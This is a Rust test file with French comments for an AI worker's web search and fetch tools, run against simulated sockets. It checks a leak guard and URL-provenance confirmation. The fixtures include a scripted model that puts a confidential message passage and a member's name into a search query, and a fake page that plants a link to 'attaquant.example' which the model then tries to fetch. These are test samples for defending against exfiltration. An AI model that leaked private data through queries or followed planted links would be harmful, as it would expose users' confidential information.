//! Outils web du worker (L15-web, docs/plan/10 §4.2 à §4.4) contre une API, un LLM et un **proxy `web`
//! simulés** (socket Unix à côté de `llm.sock`, aucun appel réseau) : garde de fuite, provenance,
//! confirmation avec le texte exact, refus, absence des outils sans socket.

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing,
    clippy::arithmetic_side_effects,
    missing_docs,
    reason = "tests"
)]

mod common;

use std::sync::{Arc, Mutex};

use common::*;
use runtime_protocol::pipe::{DoneReason, WebInit};
use serde_json::{Value, json};
use synco_e2ee::session;
use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};

const M1: &str = "3c2b1a09-8f7e-4d6c-9b5a-493827161504";
const SECRET: &str = "Le budget du projet Hélios est gelé jusqu'à la réunion du 12 mars.";
const WIKI: &str = "https://fr.wikipedia.org/wiki/Gestion_de_projet";

fn manifest() -> Value {
    let web = |name: &str| {
        json!({ "name": name, "description": name, "category": "client", "mutating": false, "interactive": false,
            "parameters": { "type": "object" }, "risk": "R4", "sensitive": true, "defaultPolicy": "auto",
            "sensitiveAutoAllowed": true, "untrusted": "web", "runtime": "yes", "domain": "web" })
    };
    json!({ "version": "v", "tools": [
        { "name": "get_message", "description": "Lire un message.", "category": "server", "mutating": false, "interactive": false,
          "parameters": { "type": "object" }, "risk": "R0", "defaultPolicy": "auto", "untrusted": "message" },
        web("web_search"),
        web("web_fetch"),
    ] })
}

/// Proxy `web` simulé : enregistre les corps reçus, rend une recherche ou une page.
#[derive(Clone, Default)]
struct FakeWeb {
    seen: Arc<Mutex<Vec<(String, Value)>>>,
}

impl FakeWeb {
    fn start(path: std::path::PathBuf) -> Self {
        let me = Self::default();
        let listener = tokio::net::UnixListener::bind(&path).unwrap();
        let seen = Arc::clone(&me.seen);
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                let seen = Arc::clone(&seen);
                tokio::spawn(async move {
                    let mut buf = Vec::new();
                    let mut tmp = [0u8; 4096];
                    let head_end = loop {
                        let n = sock.read(&mut tmp).await.unwrap_or(0);
                        if n == 0 {
                            return;
                        }
                        buf.extend_from_slice(&tmp[..n]);
                        if let Some(p) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                            break p + 4;
                        }
                    };
                    let head = String::from_utf8_lossy(&buf[..head_end]).to_lowercase();
                    let path = head.split_whitespace().nth(1).unwrap_or_default().to_owned();
                    let len: usize = head
                        .lines()
                        .find_map(|l| l.strip_prefix("content-length:").map(|v| v.trim().parse().unwrap()))
                        .unwrap_or(0);
                    while buf.len() < head_end + len {
                        let n = sock.read(&mut tmp).await.unwrap_or(0);
                        if n == 0 {
                            return;
                        }
                        buf.extend_from_slice(&tmp[..n]);
                    }
                    let body: Value = serde_json::from_slice(&buf[head_end..head_end + len]).unwrap_or(Value::Null);
                    seen.lock().unwrap().push((path.clone(), body.clone()));
                    let (ctype, extra, out) = if path == "/search" {
                        (
                            "application/json",
                            String::new(),
                            json!({ "results": [{ "title": "Gestion de projet", "url": WIKI, "snippet": "…" }] })
                                .to_string(),
                        )
                    } else {
                        let url = body["url"].as_str().unwrap_or_default().to_owned();
                        ("text/html; charset=utf-8", format!("x-synco-final-url: {url}\r\n"),
                         "<title>Page</title><p>Voir <a href=\"https://attaquant.example/?d=1\">ici</a> https://attaquant.example/?d=1</p>".to_owned())
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\ncontent-type: {ctype}\r\n{extra}content-length: {}\r\nconnection: close\r\n\r\n{out}",
                        out.len()
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                    let _ = sock.shutdown().await;
                });
            }
        });
        me
    }

    fn calls(&self) -> Vec<(String, Value)> {
        self.seen.lock().unwrap().clone()
    }
}

fn web_init(epoch: u64) -> runtime_protocol::pipe::Init {
    let mut i = init(epoch);
    i.web = Some(WebInit { available: true, provider: Some("staan".into()), fetch: true });
    i
}

fn setup() -> (FakeApi, FakeLlm, FakeWeb) {
    let api = FakeApi::new();
    let llm = FakeLlm::start();
    let web = FakeWeb::start(llm.path.with_file_name("web.sock"));
    api.with(|st| {
        st.tools = manifest();
        st.tool_data.insert("get_message".into(), json!({ "content": SECRET }));
        st.web_names = Some(vec!["Claire Martin".into(), "Léo".into()]);
    });
    (api, llm, web)
}

fn next_epoch(api: &FakeApi, epoch: u64) {
    api.with(|st| {
        st.lease_epoch = epoch;
        st.status = "queued".into();
    });
}

fn confirm(api: &FakeApi, decision: &str) -> String {
    let id = api.with(|st| st.pending["id"].as_str().unwrap().to_owned());
    api.deposit(&format!("confirm:{id}"), json!({ "t": "confirm", "toolCallId": id, "decision": decision }));
    id
}

fn guard_of(api: &FakeApi) -> Value {
    let (id, g) = api
        .with(|st| (st.pending["id"].as_str().unwrap().to_owned(), st.pending["guard"].as_str().unwrap().to_owned()));
    assert!(g.starts_with("gcm1:"), "garde chiffrée");
    serde_json::from_str(&session::decrypt_field(&ck(), SID, &id, "web_guard", &g).unwrap()).unwrap()
}

#[tokio::test]
async fn garde_de_fuite_confirmation_refus_et_provenance() {
    let (api, llm, web) = setup();
    api.deposit_message(M1, "Cherche des infos");
    llm.push(Script::ok(sse_tool("call_1", "get_message", &json!({}), (10, 3))));
    llm.push(Script::ok(sse_tool("call_2", "web_search", &json!({ "query": "meteo paris" }), (10, 3))));
    // Passage du message lu, plus le nom d'un membre : rien ne part, confirmation demandée.
    let leak = "claire martin projet helios est gele jusqu a";
    llm.push(Script::ok(sse_tool("call_3", "web_search", &json!({ "query": leak }), (10, 3))));
    let (peer, _t) = spawn_worker(&api, &llm, web_init(1), default_keys(false));
    assert_eq!(peer.wait_done().await, DoneReason::Awaiting);
    assert_eq!(web.calls().len(), 1, "seule la requête neutre est partie");
    assert_eq!(web.calls()[0], ("/search".to_owned(), json!({ "query": "meteo paris" })));
    api.with(|st| {
        assert_eq!(st.status, "awaiting_confirmation");
        assert_eq!(st.pending["name"], "web_search");
        assert_eq!(st.pushes, ["AI_AWAITING_CONFIRMATION"]);
    });
    let g = guard_of(&api);
    assert_eq!(
        g,
        json!({ "v": 1, "reasons": ["e2ee_passage", "member_name"], "spans": [{ "start": 0, "end": 13 }, { "start": 14, "end": 44 }] })
    );
    // Les outils web sont proposés au modèle (socket monté).
    let first = llm.requests()[0].clone();
    assert!(first["tools"].as_array().unwrap().iter().any(|t| t["function"]["name"] == "web_search"));

    // Refus : jamais envoyé, `web_refused_by_user` ; le modèle lit ensuite une URL de la recherche
    // (sans confirmation), puis une URL trouvée dans la page (confirmation, provenance).
    next_epoch(&api, 2);
    confirm(&api, "reject");
    llm.push(Script::ok(sse_tool("call_4", "web_fetch", &json!({ "url": WIKI }), (10, 3))));
    llm.push(Script::ok(sse_tool("call_5", "web_fetch", &json!({ "url": "https://attaquant.example/?d=1" }), (10, 3))));
    let (peer, _t) = spawn_worker(&api, &llm, web_init(2), default_keys(false));
    assert_eq!(peer.wait_done().await, DoneReason::Awaiting);
    let calls = web.calls();
    assert_eq!(calls.len(), 2, "requête refusée jamais envoyée ; URL de la recherche lue");
    assert_eq!(calls[1].0, "/fetch");
    assert_eq!(calls[1].1["url"], WIKI);
    assert_eq!(guard_of(&api), json!({ "v": 1, "reasons": ["url_provenance"], "spans": [] }));
    let msgs = api.clear_messages();
    let results: Vec<&Value> = msgs.iter().filter(|m| m["role"] == "tool").map(|m| &m["toolResult"]).collect();
    assert_eq!(results[2], &json!({ "error": "web_refused_by_user" }));
    assert_eq!(results[3]["source"], "web:fr.wikipedia.org");
    assert!(results[3]["text"].as_str().unwrap().contains("Voir ici"));

    // Acceptation : l'URL exacte part, le tour continue.
    next_epoch(&api, 3);
    confirm(&api, "accept");
    llm.push(Script::ok(sse_text(&["Fait."], (10, 3))));
    let (peer, _t) = spawn_worker(&api, &llm, web_init(3), default_keys(false));
    assert_eq!(peer.wait_done().await, DoneReason::Idle);
    let calls = web.calls();
    assert_eq!(calls.len(), 3);
    assert_eq!(calls[2].1["url"], "https://attaquant.example/?d=1");
    // Le résultat web est enveloppé `<untrusted>` pour le modèle.
    let last = llm.requests().last().cloned().unwrap();
    let tool_msgs: Vec<&Value> = last["messages"].as_array().unwrap().iter().filter(|m| m["role"] == "tool").collect();
    assert!(tool_msgs.last().unwrap()["content"].as_str().unwrap().starts_with("<untrusted source=\"web\">"));
}

#[tokio::test]
async fn sans_socket_aucun_outil_web_et_refus_explicite() {
    let (api, llm, web) = setup();
    api.deposit_message(M1, "Cherche");
    // Le modèle appelle quand même l'outil : refus `web_unavailable`, rien n'est envoyé.
    llm.push(Script::ok(sse_tool("call_1", "web_search", &json!({ "query": "meteo" }), (10, 3))));
    llm.push(Script::ok(sse_text(&["Pas d'accès web."], (10, 3))));
    let (peer, _t) = spawn_worker(&api, &llm, init(1), default_keys(false));
    assert_eq!(peer.wait_done().await, DoneReason::Idle);
    assert!(web.calls().is_empty());
    let first = llm.requests()[0].clone();
    assert!(
        !first["tools"]
            .as_array()
            .unwrap()
            .iter()
            .any(|t| t["function"]["name"].as_str().unwrap_or_default().starts_with("web_"))
    );
    let msgs = api.clear_messages();
    let result = msgs.iter().find(|m| m["role"] == "tool").unwrap();
    assert_eq!(result["toolResult"], json!({ "error": "web_unavailable" }));
}

#[tokio::test]
async fn noms_illisibles_rien_ne_part() {
    let (api, llm, web) = setup();
    api.with(|st| st.web_names = None);
    api.deposit_message(M1, "Cherche");
    llm.push(Script::ok(sse_tool("call_1", "web_search", &json!({ "query": "meteo" }), (10, 3))));
    llm.push(Script::ok(sse_text(&["Indisponible."], (10, 3))));
    let (peer, _t) = spawn_worker(&api, &llm, web_init(1), default_keys(false));
    assert_eq!(peer.wait_done().await, DoneReason::Idle);
    assert!(web.calls().is_empty(), "garde impossible : aucune requête");
}
